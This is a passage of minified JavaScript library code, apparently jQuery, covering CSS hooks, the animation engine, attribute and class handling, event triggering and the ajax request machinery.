i,a,o,n=[],r=0,s=t.length;s>r;r++)(a=t[r]).style&&(n[r]=L.get(a,"olddisplay"),i=a.style.display,e?(n[r]||"none"!==i||(a.style.display=""),""===a.style.display&&B(a)&&(n[r]=L.access(a,"olddisplay",Ct(a.nodeName)))):(o=B(a),"none"===i&&o||L.set(a,"olddisplay",o?i:h.css(a,"display"))));for(r=0;s>r;r++)(a=t[r]).style&&(e&&"none"!==a.style.display&&""!==a.style.display||(a.style.display=e?n[r]||"":"none"));return t}function Ht(t,e,i,a,o){return new Ht.prototype.init(t,e,i,a,o)}h.extend({cssHooks:{opacity:{get:function(t,e){if(e){var i=Dt(t,"opacity");return""===i?"1":i}}}},cssNumber:{animationIterationCount:!0,columnCount:!0,fillOpacity:!0,flexGrow:!0,flexShrink:!0,fontWeight:!0,lineHeight:!0,opacity:!0,order:!0,orphans:!0,widows:!0,zIndex:!0,zoom:!0},cssProps:{float:"cssFloat"},style:function(t,e,i,a){if(t&&3!==t.nodeType&&8!==t.nodeType&&t.style){var o,n,r,s=h.camelCase(e),l=t.style;return e=h.cssProps[s]||(h.cssProps[s]=Pt(s)||s),r=h.cssHooks[e]||h.cssHooks[s],void 0===i?r&&"get"in r&&void 0!==(o=r.get(t,!1,a))?o:l[e]:("string"===(n=typeof i)&&(o=z.exec(i))&&o[1]&&(i=V(t,e,o),n="number"),void(null!=i&&i==i&&("number"===n&&(i+=o&&o[3]||(h.cssNumber[s]?"":"px")),p.clearCloneStyle||""!==i||0!==e.indexOf("background")||(l[e]="inherit"),r&&"set"in r&&void 0===(i=r.set(t,i,a))||(l[e]=i))))}},css:function(t,e,i,a){var o,n,r,s=h.camelCase(e);return e=h.cssProps[s]||(h.cssProps[s]=Pt(s)||s),(r=h.cssHooks[e]||h.cssHooks[s])&&"get"in r&&(o=r.get(t,!0,i)),void 0===o&&(o=Dt(t,e,a)),"normal"===o&&e in Mt&&(o=Mt[e]),""===i||i?(n=parseFloat(o),!0===i||isFinite(n)?n||0:o):o}}),h.each(["height","width"],(function(t,e){h.cssHooks[e]={get:function(t,i,a){return i?Ft.test(h.css(t,"display"))&&0===t.offsetWidth?_t(t,Ot,(function(){return Rt(t,e,a)})):Rt(t,e,a):void 0},set:function(t,i,a){var o,n=a&&Tt(t),r=a&&jt(t,e,a,"border-box"===h.css(t,"boxSizing",!1,n),n);return r&&(o=z.exec(i))&&"px"!==(o[3]||"px")&&(t.style[e]=i,i=h.css(t,e)),Lt(0,i,r)}}})),h.cssHooks.marginLeft=At(p.reliableMarginLeft,(function(t,e){return e?(parseFloat(Dt(t,"marginLeft"))||t.getBoundingClientRect().left-_t(t,{marginLeft:0},(function(){return t.getBoundingClientRect().left})))+"px":void 0})),h.cssHooks.marginRight=At(p.reliableMarginRight,(function(t,e){return e?_t(t,{display:"inline-block"},Dt,[t,"marginRight"]):void 0})),h.each({margin:"",padding:"",border:"Width"},(function(t,e){h.cssHooks[t+e]={expand:function(i){for(var a=0,o={},n="string"==typeof i?i.split(" "):[i];4>a;a++)o[t+W[a]+e]=n[a]||n[a-2]||n[0];return o}},kt.test(t)||(h.cssHooks[t+e].set=Lt)})),h.fn.extend({css:function(t,e){return N(this,(function(t,e,i){var a,o,n={},r=0;if(h.isArray(e)){for(a=Tt(t),o=e.length;o>r;r++)n[e[r]]=h.css(t,e[r],!1,a);return n}return void 0!==i?h.style(t,e,i):h.css(t,e)}),t,e,arguments.length>1)},show:function(){return qt(this,!0)},hide:function(){return qt(this)},toggle:function(t){return"boolean"==typeof t?t?this.show():this.hide():this.each((function(){B(this)?h(this).show():h(this).hide()}))}}),h.Tween=Ht,Ht.prototype={constructor:Ht,init:function(t,e,i,a,o,n){this.elem=t,this.prop=i,this.easing=o||h.easing._default,this.options=e,this.start=this.now=this.cur(),this.end=a,this.unit=n||(h.cssNumber[i]?"":"px")},cur:function(){var t=Ht.propHooks[this.prop];return t&&t.get?t.get(this):Ht.propHooks._default.get(this)},run:function(t){var e,i=Ht.propHooks[this.prop];return this.options.duration?this.pos=e=h.easing[this.easing](t,this.options.duration*t,0,1,this.options.duration):this.pos=e=t,this.now=(this.end-this.start)*e+this.start,this.options.step&&this.options.step.call(this.elem,this.now,this),i&&i.set?i.set(this):Ht.propHooks._default.set(this),this}},Ht.prototype.init.prototype=Ht.prototype,Ht.propHooks={_default:{get:function(t){var e;return 1!==t.elem.nodeType||null!=t.elem[t.prop]&&null==t.elem.style[t.prop]?t.elem[t.prop]:(e=h.css(t.elem,t.prop,""))&&"auto"!==e?e:0},set:function(t){h.fx.step[t.prop]?h.fx.step[t.prop](t):1!==t.elem.nodeType||null==t.elem.style[h.cssProps[t.prop]]&&!h.cssHooks[t.prop]?t.elem[t.prop]=t.now:h.style(t.elem,t.prop,t.now+t.unit)}}},Ht.propHooks.scrollTop=Ht.propHooks.scrollLeft={set:function(t){t.elem.nodeType&&t.elem.parentNode&&(t.elem[t.prop]=t.now)}},h.easing={linear:function(t){return t},swing:function(t){return.5-Math.cos(t*Math.PI)/2},_default:"swing"},h.fx=Ht.prototype.init,h.fx.step={};var Ut,zt,Wt=/^(?:toggle|show|hide)$/,Bt=/queueHooks$/;function Vt(){return t.setTimeout((function(){Ut=void 0})),Ut=h.now()}function Jt(t,e){var i,a=0,o={height:t};for(e=e?1:0;4>a;a+=2-e)o["margin"+(i=W[a])]=o["padding"+i]=t;return e&&(o.opacity=o.width=t),o}function Qt(t,e,i){for(var a,o=(Gt.tweeners[e]||[]).concat(Gt.tweeners["*"]),n=0,r=o.length;r>n;n++)if(a=o[n].call(i,e,t))return a}function Gt(t,e,i){var a,o,n=0,r=Gt.prefilters.length,s=h.Deferred().always((function(){delete l.elem})),l=function(){if(o)return!1;for(var e=Ut||Vt(),i=Math.max(0,c.startTime+c.duration-e),a=1-(i/c.duration||0),n=0,r=c.tweens.length;r>n;n++)c.tweens[n].run(a);return s.notifyWith(t,[c,a,i]),1>a&&r?i:(s.resolveWith(t,[c]),!1)},c=s.promise({elem:t,props:h.extend({},e),opts:h.extend(!0,{specialEasing:{},easing:h.easing._default},i),originalProperties:e,originalOptions:i,startTime:Ut||Vt(),duration:i.duration,tweens:[],createTween:function(e,i){var a=h.Tween(t,c.opts,e,i,c.opts.specialEasing[e]||c.opts.easing);return c.tweens.push(a),a},stop:function(e){var i=0,a=e?c.tweens.length:0;if(o)return this;for(o=!0;a>i;i++)c.tweens[i].run(1);return e?(s.notifyWith(t,[c,1,0]),s.resolveWith(t,[c,e])):s.rejectWith(t,[c,e]),this}}),d=c.props;for(function(t,e){var i,a,o,n,r;for(i in t)if(o=e[a=h.camelCase(i)],n=t[i],h.isArray(n)&&(o=n[1],n=t[i]=n[0]),i!==a&&(t[a]=n,delete t[i]),(r=h.cssHooks[a])&&"expand"in r)for(i in n=r.expand(n),delete t[a],n)i in t||(t[i]=n[i],e[i]=o);else e[a]=o}(d,c.opts.specialEasing);r>n;n++)if(a=Gt.prefilters[n].call(c,t,d,c.opts))return h.isFunction(a.stop)&&(h._queueHooks(c.elem,c.opts.queue).stop=h.proxy(a.stop,a)),a;return h.map(d,Qt,c),h.isFunction(c.opts.start)&&c.opts.start.call(t,c),h.fx.timer(h.extend(l,{elem:t,anim:c,queue:c.opts.queue})),c.progress(c.opts.progress).done(c.opts.done,c.opts.complete).fail(c.opts.fail).always(c.opts.always)}h.Animation=h.extend(Gt,{tweeners:{"*":[function(t,e){var i=this.createTween(t,e);return V(i.elem,t,z.exec(e),i),i}]},tweener:function(t,e){h.isFunction(t)?(e=t,t=["*"]):t=t.match(O);for(var i,a=0,o=t.length;o>a;a++)i=t[a],Gt.tweeners[i]=Gt.tweeners[i]||[],Gt.tweeners[i].unshift(e)},prefilters:[function(t,e,i){var a,o,n,r,s,l,c,d=this,p={},u=t.style,f=t.nodeType&&B(t),m=L.get(t,"fxshow");for(a in i.queue||(null==(s=h._queueHooks(t,"fx")).unqueued&&(s.unqueued=0,l=s.empty.fire,s.empty.fire=function(){s.unqueued||l()}),s.unqueued++,d.always((function(){d.always((function(){s.unqueued--,h.queue(t,"fx").length||s.empty.fire()}))}))),1===t.nodeType&&("height"in e||"width"in e)&&(i.overflow=[u.overflow,u.overflowX,u.overflowY],"inline"===("none"===(c=h.css(t,"display"))?L.get(t,"olddisplay")||Ct(t.nodeName):c)&&"none"===h.css(t,"float")&&(u.display="inline-block")),i.overflow&&(u.overflow="hidden",d.always((function(){u.overflow=i.overflow[0],u.overflowX=i.overflow[1],u.overflowY=i.overflow[2]}))),e)if(o=e[a],Wt.exec(o)){if(delete e[a],n=n||"toggle"===o,o===(f?"hide":"show")){if("show"!==o||!m||void 0===m[a])continue;f=!0}p[a]=m&&m[a]||h.style(t,a)}else c=void 0;if(h.isEmptyObject(p))"inline"===("none"===c?Ct(t.nodeName):c)&&(u.display=c);else for(a in m?"hidden"in m&&(f=m.hidden):m=L.access(t,"fxshow",{}),n&&(m.hidden=!f),f?h(t).show():d.done((function(){h(t).hide()})),d.done((function(){var e;for(e in L.remove(t,"fxshow"),p)h.style(t,e,p[e])})),p)r=Qt(f?m[a]:0,a,d),a in m||(m[a]=r.start,f&&(r.end=r.start,r.start="width"===a||"height"===a?1:0))}],prefilter:function(t,e){e?Gt.prefilters.unshift(t):Gt.prefilters.push(t)}}),h.speed=function(t,e,i){var a=t&&"object"==typeof t?h.extend({},t):{complete:i||!i&&e||h.isFunction(t)&&t,duration:t,easing:i&&e||e&&!h.isFunction(e)&&e};return a.duration=h.fx.off?0:"number"==typeof a.duration?a.duration:a.duration in h.fx.speeds?h.fx.speeds[a.duration]:h.fx.speeds._default,null!=a.queue&&!0!==a.queue||(a.queue="fx"),a.old=a.complete,a.complete=function(){h.isFunction(a.old)&&a.old.call(this),a.queue&&h.dequeue(this,a.queue)},a},h.fn.extend({fadeTo:function(t,e,i,a){return this.filter(B).css("opacity",0).show().end().animate({opacity:e},t,i,a)},animate:function(t,e,i,a){var o=h.isEmptyObject(t),n=h.speed(e,i,a),r=function(){var e=Gt(this,h.extend({},t),n);(o||L.get(this,"finish"))&&e.stop(!0)};return r.finish=r,o||!1===n.queue?this.each(r):this.queue(n.queue,r)},stop:function(t,e,i){var a=function(t){var e=t.stop;delete t.stop,e(i)};return"string"!=typeof t&&(i=e,e=t,t=void 0),e&&!1!==t&&this.queue(t||"fx",[]),this.each((function(){var e=!0,o=null!=t&&t+"queueHooks",n=h.timers,r=L.get(this);if(o)r[o]&&r[o].stop&&a(r[o]);else for(o in r)r[o]&&r[o].stop&&Bt.test(o)&&a(r[o]);for(o=n.length;o--;)n[o].elem!==this||null!=t&&n[o].queue!==t||(n[o].anim.stop(i),e=!1,n.splice(o,1));!e&&i||h.dequeue(this,t)}))},finish:function(t){return!1!==t&&(t=t||"fx"),this.each((function(){var e,i=L.get(this),a=i[t+"queue"],o=i[t+"queueHooks"],n=h.timers,r=a?a.length:0;for(i.finish=!0,h.queue(this,t,[]),o&&o.stop&&o.stop.call(this,!0),e=n.length;e--;)n[e].elem===this&&n[e].queue===t&&(n[e].anim.stop(!0),n.splice(e,1));for(e=0;r>e;e++)a[e]&&a[e].finish&&a[e].finish.call(this);delete i.finish}))}}),h.each(["toggle","show","hide"],(function(t,e){var i=h.fn[e];h.fn[e]=function(t,a,o){return null==t||"boolean"==typeof t?i.apply(this,arguments):this.animate(Jt(e,!0),t,a,o)}})),h.each({slideDown:Jt("show"),slideUp:Jt("hide"),slideToggle:Jt("toggle"),fadeIn:{opacity:"show"},fadeOut:{opacity:"hide"},fadeToggle:{opacity:"toggle"}},(function(t,e){h.fn[t]=function(t,i,a){return this.animate(e,t,i,a)}})),h.timers=[],h.fx.tick=function(){var t,e=0,i=h.timers;for(Ut=h.now();e<i.length;e++)(t=i[e])()||i[e]!==t||i.splice(e--,1);i.length||h.fx.stop(),Ut=void 0},h.fx.timer=function(t){h.timers.push(t),t()?h.fx.start():h.timers.pop()},h.fx.interval=13,h.fx.start=function(){zt||(zt=t.setInterval(h.fx.tick,h.fx.interval))},h.fx.stop=function(){t.clearInterval(zt),zt=null},h.fx.speeds={slow:600,fast:200,_default:400},h.fn.delay=function(e,i){return e=h.fx&&h.fx.speeds[e]||e,i=i||"fx",this.queue(i,(function(i,a){var o=t.setTimeout(i,e);a.stop=function(){t.clearTimeout(o)}}))},function(){var t=a.createElement("input"),e=a.createElement("select"),i=e.appendChild(a.createElement("option"));t.type="checkbox",p.checkOn=""!==t.value,p.optSelected=i.selected,e.disabled=!0,p.optDisabled=!i.disabled,(t=a.createElement("input")).value="t",t.type="radio",p.radioValue="t"===t.value}();var Yt,Zt=h.expr.attrHandle;h.fn.extend({attr:function(t,e){return N(this,h.attr,t,e,arguments.length>1)},removeAttr:function(t){return this.each((function(){h.removeAttr(this,t)}))}}),h.extend({attr:function(t,e,i){var a,o,n=t.nodeType;if(3!==n&&8!==n&&2!==n)return void 0===t.getAttribute?h.prop(t,e,i):(1===n&&h.isXMLDoc(t)||(e=e.toLowerCase(),o=h.attrHooks[e]||(h.expr.match.bool.test(e)?Yt:void 0)),void 0!==i?null===i?void h.removeAttr(t,e):o&&"set"in o&&void 0!==(a=o.set(t,i,e))?a:(t.setAttribute(e,i+""),i):o&&"get"in o&&null!==(a=o.get(t,e))?a:null==(a=h.find.attr(t,e))?void 0:a)},attrHooks:{type:{set:function(t,e){if(!p.radioValue&&"radio"===e&&h.nodeName(t,"input")){var i=t.value;return t.setAttribute("type",e),i&&(t.value=i),e}}}},removeAttr:function(t,e){var i,a,o=0,n=e&&e.match(O);if(n&&1===t.nodeType)for(;i=n[o++];)a=h.propFix[i]||i,h.expr.match.bool.test(i)&&(t[a]=!1),t.removeAttribute(i)}}),Yt={set:function(t,e,i){return!1===e?h.removeAttr(t,i):t.setAttribute(i,i),i}},h.each(h.expr.match.bool.source.match(/\w+/g),(function(t,e){var i=Zt[e]||h.find.attr;Zt[e]=function(t,e,a){var o,n;return a||(n=Zt[e],Zt[e]=o,o=null!=i(t,e,a)?e.toLowerCase():null,Zt[e]=n),o}}));var Xt=/^(?:input|select|textarea|button)$/i,Kt=/^(?:a|area)$/i;h.fn.extend({prop:function(t,e){return N(this,h.prop,t,e,arguments.length>1)},removeProp:function(t){return this.each((function(){delete this[h.propFix[t]||t]}))}}),h.extend({prop:function(t,e,i){var a,o,n=t.nodeType;if(3!==n&&8!==n&&2!==n)return 1===n&&h.isXMLDoc(t)||(e=h.propFix[e]||e,o=h.propHooks[e]),void 0!==i?o&&"set"in o&&void 0!==(a=o.set(t,i,e))?a:t[e]=i:o&&"get"in o&&null!==(a=o.get(t,e))?a:t[e]},propHooks:{tabIndex:{get:function(t){var e=h.find.attr(t,"tabindex");return e?parseInt(e,10):Xt.test(t.nodeName)||Kt.test(t.nodeName)&&t.href?0:-1}}},propFix:{for:"htmlFor",class:"className"}}),p.optSelected||(h.propHooks.selected={get:function(t){var e=t.parentNode;return e&&e.parentNode&&e.parentNode.selectedIndex,null},set:function(t){var e=t.parentNode;e&&(e.selectedIndex,e.parentNode&&e.parentNode.selectedIndex)}}),h.each(["tabIndex","readOnly","maxLength","cellSpacing","cellPadding","rowSpan","colSpan","useMap","frameBorder","contentEditable"],(function(){h.propFix[this.toLowerCase()]=this}));var te=/[\t\r\n\f]/g;function ee(t){return t.getAttribute&&t.getAttribute("class")||""}h.fn.extend({addClass:function(t){var e,i,a,o,n,r,s,l=0;if(h.isFunction(t))return this.each((function(e){h(this).addClass(t.call(this,e,ee(this)))}));if("string"==typeof t&&t)for(e=t.match(O)||[];i=this[l++];)if(o=ee(i),a=1===i.nodeType&&(" "+o+" ").replace(te," ")){for(r=0;n=e[r++];)a.indexOf(" "+n+" ")<0&&(a+=n+" ");o!==(s=h.trim(a))&&i.setAttribute("class",s)}return this},removeClass:function(t){var e,i,a,o,n,r,s,l=0;if(h.isFunction(t))return this.each((function(e){h(this).removeClass(t.call(this,e,ee(this)))}));if(!arguments.length)return this.attr("class","");if("string"==typeof t&&t)for(e=t.match(O)||[];i=this[l++];)if(o=ee(i),a=1===i.nodeType&&(" "+o+" ").replace(te," ")){for(r=0;n=e[r++];)for(;a.indexOf(" "+n+" ")>-1;)a=a.replace(" "+n+" "," ");o!==(s=h.trim(a))&&i.setAttribute("class",s)}return this},toggleClass:function(t,e){var i=typeof t;return"boolean"==typeof e&&"string"===i?e?this.addClass(t):this.removeClass(t):h.isFunction(t)?this.each((function(i){h(this).toggleClass(t.call(this,i,ee(this),e),e)})):this.each((function(){var e,a,o,n;if("string"===i)for(a=0,o=h(this),n=t.match(O)||[];e=n[a++];)o.hasClass(e)?o.removeClass(e):o.addClass(e);else void 0!==t&&"boolean"!==i||((e=ee(this))&&L.set(this,"__className__",e),this.setAttribute&&this.setAttribute("class",e||!1===t?"":L.get(this,"__className__")||""))}))},hasClass:function(t){var e,i,a=0;for(e=" "+t+" ";i=this[a++];)if(1===i.nodeType&&(" "+ee(i)+" ").replace(te," ").indexOf(e)>-1)return!0;return!1}});var ie=/\r/g,ae=/[\x20\t\r\n\f]+/g;h.fn.extend({val:function(t){var e,i,a,o=this[0];return arguments.length?(a=h.isFunction(t),this.each((function(i){var o;1===this.nodeType&&(null==(o=a?t.call(this,i,h(this).val()):t)?o="":"number"==typeof o?o+="":h.isArray(o)&&(o=h.map(o,(function(t){return null==t?"":t+""}))),(e=h.valHooks[this.type]||h.valHooks[this.nodeName.toLowerCase()])&&"set"in e&&void 0!==e.set(this,o,"value")||(this.value=o))}))):o?(e=h.valHooks[o.type]||h.valHooks[o.nodeName.toLowerCase()])&&"get"in e&&void 0!==(i=e.get(o,"value"))?i:"string"==typeof(i=o.value)?i.replace(ie,""):null==i?"":i:void 0}}),h.extend({valHooks:{option:{get:function(t){var e=h.find.attr(t,"value");return null!=e?e:h.trim(h.text(t)).replace(ae," ")}},select:{get:function(t){for(var e,i,a=t.options,o=t.selectedIndex,n="select-one"===t.type||0>o,r=n?null:[],s=n?o+1:a.length,l=0>o?s:n?o:0;s>l;l++)if(((i=a[l]).selected||l===o)&&(p.optDisabled?!i.disabled:null===i.getAttribute("disabled"))&&(!i.parentNode.disabled||!h.nodeName(i.parentNode,"optgroup"))){if(e=h(i).val(),n)return e;r.push(e)}return r},set:function(t,e){for(var i,a,o=t.options,n=h.makeArray(e),r=o.length;r--;)((a=o[r]).selected=h.inArray(h.valHooks.option.get(a),n)>-1)&&(i=!0);return i||(t.selectedIndex=-1),n}}}}),h.each(["radio","checkbox"],(function(){h.valHooks[this]={set:function(t,e){return h.isArray(e)?t.checked=h.inArray(h(t).val(),e)>-1:void 0}},p.checkOn||(h.valHooks[this].get=function(t){return null===t.getAttribute("value")?"on":t.value})}));var oe=/^(?:focusinfocus|focusoutblur)$/;h.extend(h.event,{trigger:function(e,i,o,n){var r,s,l,c,p,u,f,m=[o||a],g=d.call(e,"type")?e.type:e,v=d.call(e,"namespace")?e.namespace.split("."):[];if(s=l=o=o||a,3!==o.nodeType&&8!==o.nodeType&&!oe.test(g+h.event.triggered)&&(g.indexOf(".")>-1&&(v=g.split("."),g=v.shift(),v.sort()),p=g.indexOf(":")<0&&"on"+g,(e=e[h.expando]?e:new h.Event(g,"object"==typeof e&&e)).isTrigger=n?2:3,e.namespace=v.join("."),e.rnamespace=e.namespace?new RegExp("(^|\\.)"+v.join("\\.(?:.*\\.|)")+"(\\.|$)"):null,e.result=void 0,e.target||(e.target=o),i=null==i?[e]:h.makeArray(i,[e]),f=h.event.special[g]||{},n||!f.trigger||!1!==f.trigger.apply(o,i))){if(!n&&!f.noBubble&&!h.isWindow(o)){for(c=f.delegateType||g,oe.test(c+g)||(s=s.parentNode);s;s=s.parentNode)m.push(s),l=s;l===(o.ownerDocument||a)&&m.push(l.defaultView||l.parentWindow||t)}for(r=0;(s=m[r++])&&!e.isPropagationStopped();)e.type=r>1?c:f.bindType||g,(u=(L.get(s,"events")||{})[e.type]&&L.get(s,"handle"))&&u.apply(s,i),(u=p&&s[p])&&u.apply&&I(s)&&(e.result=u.apply(s,i),!1===e.result&&e.preventDefault());return e.type=g,n||e.isDefaultPrevented()||f._default&&!1!==f._default.apply(m.pop(),i)||!I(o)||p&&h.isFunction(o[g])&&!h.isWindow(o)&&((l=o[p])&&(o[p]=null),h.event.triggered=g,o[g](),h.event.triggered=void 0,l&&(o[p]=l)),e.result}},simulate:function(t,e,i){var a=h.extend(new h.Event,i,{type:t,isSimulated:!0});h.event.trigger(a,null,e)}}),h.fn.extend({trigger:function(t,e){return this.each((function(){h.event.trigger(t,e,this)}))},triggerHandler:function(t,e){var i=this[0];return i?h.event.trigger(t,e,i,!0):void 0}}),h.each("blur focus focusin focusout load resize scroll unload click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup error contextmenu".split(" "),(function(t,e){h.fn[e]=function(t,i){return arguments.length>0?this.on(e,null,t,i):this.trigger(e)}})),h.fn.extend({hover:function(t,e){return this.mouseenter(t).mouseleave(e||t)}}),p.focusin="onfocusin"in t,p.focusin||h.each({focus:"focusin",blur:"focusout"},(function(t,e){var i=function(t){h.event.simulate(e,t.target,h.event.fix(t))};h.event.special[e]={setup:function(){var a=this.ownerDocument||this,o=L.access(a,e);o||a.addEventListener(t,i,!0),L.access(a,e,(o||0)+1)},teardown:function(){var a=this.ownerDocument||this,o=L.access(a,e)-1;o?L.access(a,e,o):(a.removeEventListener(t,i,!0),L.remove(a,e))}}}));var ne=t.location,re=h.now(),se=/\?/;h.parseJSON=function(t){return JSON.parse(t+"")},h.parseXML=function(e){var i;if(!e||"string"!=typeof e)return null;try{i=(new t.DOMParser).parseFromString(e,"text/xml")}catch(t){i=void 0}return i&&!i.getElementsByTagName("parsererror").length||h.error("Invalid XML: "+e),i};var le=/#.*$/,ce=/([?&])_=[^&]*/,de=/^(.*?):[ \t]*([^\r\n]*)$/gm,pe=/^(?:GET|HEAD)$/,ue=/^\/\//,he={},fe={},me="*/".concat("*"),ge=a.createElement("a");function ve(t){return function(e,i){"string"!=typeof e&&(i=e,e="*");var a,o=0,n=e.toLowerCase().match(O)||[];if(h.isFunction(i))for(;a=n[o++];)"+"===a[0]?(a=a.slice(1)||"*",(t[a]=t[a]||[]).unshift(i)):(t[a]=t[a]||[]).push(i)}}function ye(t,e,i,a){var o={},n=t===fe;function r(s){var l;return o[s]=!0,h.each(t[s]||[],(function(t,s){var c=s(e,i,a);return"string"!=typeof c||n||o[c]?n?!(l=c):void 0:(e.dataTypes.unshift(c),r(c),!1)})),l}return r(e.dataTypes[0])||!o["*"]&&r("*")}function $e(t,e){var i,a,o=h.ajaxSettings.flatOptions||{};for(i in e)void 0!==e[i]&&((o[i]?t:a||(a={}))[i]=e[i]);return a&&h.extend(!0,t,a),t}ge.href=ne.href,h.extend({active:0,lastModified:{},etag:{},ajaxSettings:{url:ne.href,type:"GET",isLocal:/^(?:about|app|app-storage|.+-extension|file|res|widget):$/.test(ne.protocol),global:!0,processData:!0,async:!0,contentType:"application/x-www-form-urlencoded; charset=UTF-8",accepts:{"*":me,text:"text/plain",html:"text/html",xml:"application/xml, text/xml",json:"application/json, text/javascript"},contents:{xml:/\bxml\b/,html:/\bhtml/,json:/\bjson\b/},responseFields:{xml:"responseXML",text:"responseText",json:"responseJSON"},converters:{"* text":String,"text html":!0,"text json":h.parseJSON,"text xml":h.parseXML},flatOptions:{url:!0,context:!0}},ajaxSetup:function(t,e){return e?$e($e(t,h.ajaxSettings),e):$e(h.ajaxSettings,t)},ajaxPrefilter:ve(he),ajaxTransport:ve(fe),ajax:function(e,i){"object"==typeof e&&(i=e,e=void 0),i=i||{};var o,n,r,s,l,c,d,p,u=h.ajaxSetup({},i),f=u.context||u,m=u.context&&(f.nodeType||f.jquery)?h(f):h.event,g=h.Deferred(),v=h.Callbacks("once memory"),y=u.statusCode||{},$={},b={},w=0,x="canceled",C={readyState:0,getResponseHeader:function(t){var e;if(2===w){if(!s)for(s={};e=de.exec(r);)s[e[1].toLowerCase()]=e[2];e=s[t.toLowerCase()]}return null==e?null:e},getAllResponseHeaders:function(){return 2===w?r:null},setRequestHeader:function(t,e){var i=t.toLowerCase();return w||(t=b[i]=b[i]||t,$[t]=e),this},overrideMimeType:function(t){return w||(u.mimeType=t),this},statusCode:function(t){var e;if(t)if(2>w)for(e in t)y[e]=[y[e],t[e]];else C.always(t[C.status]);return this},abort:function(t){var e=t||x;return o&&o.abort(e),k(0,e),this}};if(g.promise(C).complete=v.add,C.success=C.done,C.error=C.fail,u.url=((e||u.url||ne.href)+"").replace(le,"").replace(ue,ne.protocol+"//"),u.type=i.method||i.type||u.method||u.type,u.dataTypes=h.trim(u.dataType||"*").toLowerCase().match(O)||[""],null==u.crossDomain){c=a.createElement("a");try{c.href=u.url,c.href=c.href,u.crossDomain=ge.protocol+"//"+ge.host!=c.protocol+"//"+c.host}catch(t){u.crossDomain=!0}}if(u.data&&u.processData&&"string"!=typeof u.data&&(u.data=h.param(u.data,u.traditional)),ye(he,u,i,C),2===w)return C;for(p in(d=h.event&&u.global)&&0==h.active++&&h.event.trigger("ajaxStart"),u.type=u.type.toUpperCase(),u.hasContent=!pe.test(u.type),n=u.url,u.hasContent||(u.data&&(n=u.url+=(se.test(n)?"&":"?")+u.data,delete u.data),!1===u.cache&&(u.url=ce.test(n)?n.replace(ce,"$1_="+re++):n+(se.test(n)?"&":"?")+"_="+re++)),u.ifModified&&(h.lastModified[n]&&C.setRequestHeader("If-Modified-Since",h.lastModified[n]),h.etag[n]&&C.setRequestHeader("If-None-Match",h.etag[n])),(u.data&&u.hasContent&&!1!==u.contentType||i.contentType)&&C.setRequestHeader("Content-Type",u.contentType),C.setRequestHeader("Accept",u.dataTypes[0]&&u.accepts[u.dataTypes[0]]?u.accepts[u.dataTypes[0]]+("*"!==u.dataTypes[0]?", "+me+"; q=0.01":""):u.accepts["*"]),u.headers)C.setRequestHeader(p,u.headers[p]);if(u.beforeSend&&(!1===u.beforeSend.call(f,C,u)||2===w))return C.abort();for(p in x="abort",{success:1,error:1,complete:1})C[p](u[p]);if(o=ye(fe,u,i,C)){if(C.readyState=1,d&&m.trigger("ajaxSend",[C,u]),2===w)return C;u.async&&u.timeout>0&&(l=t.setTimeout((function(){C.abort("timeout")}),u.timeout));try{w=1,o.send($,k)}catch(t){if(!(2>w))throw t;k(-1,t)}}else k(-1,"No Transport");function k(e,i,a,s){var c,p,$,b,x,k=i;2!==w&&(w=2,l&&t.clearTimeout(l),o=void 0,r=s||"",C.readyState=e>0?4:0,c=e>=200&&300>e||304===e,a&&(b=function(t,e,i){for(var a,o,n,r,s=t.contents,l=t.dataTypes;"*"===l[0];)l.shift(),void 0===a&&(a=t.mimeType||e.getResponseHeader("Content-Type"));if(a)for(o in s)if(s[o]&&s[o].test(a)){l.unshift(o);break}if(l[0]in i)n=l[0];else{for(o in i){if(!l[0]||t.converters[o+" "+l[0]]){n=o;break}r||(r=o)}n=n||r}return n?(n!==l[0]&&l.unshift(n),i[n]):void 0}(u,C,a)),b=function(t,e,i,a){var o,n,r,s,l,c={},d=t.dataTypes.slice();if(d[1])for(r in t.converters)c[r.toLowerCase()]=t.converters[r];for(n=d.shift();n;)if(t.responseFields[n]&&(i[t.responseFields[n]]=e),!l&&a&&t.dataFilter&&(e=t.dataFilter(e,t.dataType)),l=n,n=d.shift())if("*"===n)n=l;else if("*"!==l&&l!==n){if(!(r=c[l+" "+n]||c["* "+n]))for(o in c)if((s=o.split(" "))[1]===n&&(r=c[l+" "+s[0]]||c["* "+s[0]])){!0===r?r=c[o]:!0!==c[o]&&(n=s[0],d.unshift(s[1]));break}if(!0!==r)if(r&&t.throws)e=r(e);else try{e=r(e)}catch(t){return{state:"parsererror",error:r?t:"No conversion from "+l+" to "+n}}}return{state:"success",data:e}}(u,b,C,c),c?(u.ifModified&&((x=C.getResponseHeader("Last-Modified"))&&(h.lastModified[n]=x),(x=C.getResponseHeader("etag"))&&(h.etag[n]=x)),204===e||"HEAD"===u.type?k="nocontent":304===e?k="notmodified":(k=b.state,p=b.data,c=!($=b.error))):($=k,!e&&k||(k="error",0>e&&(e=0))),C.status=e,C.statusText=(i||k)+"",c?g.resolveWith(f,[p,k,C]):g.rejectWith(f,[C,k,$]),C.statusCode(y),y=void 0,d&&m.trigger(c?"ajaxSuccess":"ajaxError",[C,u,c?p:$]),v.fireWith(f,[C,k]),d&&(m.trigger("ajaxComplete",[C,u]),--h.active||h.event.trigger("ajaxStop")))}return C},getJSON:function(t,e,i){return h.get(t,e,i,"json")},getScript:function(t,e){return h.get(t,void 0,e,"script")}}),h.each(["get","post"],(function(t,e){h[e]=function(t,i,a,o){return h.isFunction(i)&&(o=o||a,a=i,i=void 0),h.ajax(h.extend({url:t,type:e,dataType:o,data:i,success:a},h.isPlainObject(t)&&t))}})),h._evalUrl=function(t){return h.ajax({url:t,type:"GET",dataType:"script",async:!1,global:!1,throws:!0})},h.fn.extend({wrapAll:function(t){var e;return h.isFunction(t)?this.each((function(e){h(this).wrapAll(t.call(this,e))})):(this[0]&&(e=h(t,this[0].ownerDocument).eq(0).clone(!0),this[0].parentNode&&e.insertBefore(this[0]),e.map((function(){for(var t=this;t.firstElementChild;)t=t.firstElementChild;return t})).append(this)),this)},wrapInner:function(t){return h.isFunction(t)?this.each((function(e){h(this).wrapInner(t.call(this,e))})):this.each((function(){var e=h(this),i=e.contents();i.length?i.wrapAll(t):e.append(t)}))},wrap:function(t){var e=h.isFunction(t);return this.each((function(i){h(this).wrapAll(e?t.call(this,i):t)}))},unwrap:function(){return this.parent().each((function(){h.nodeName(this,"body")||h(this).replaceWith(this.childNodes)})).end()}}),h.expr.filters.hidden=function(t){return!h.expr.filters.visible(t)},h.expr.filters.visible=function(t){return 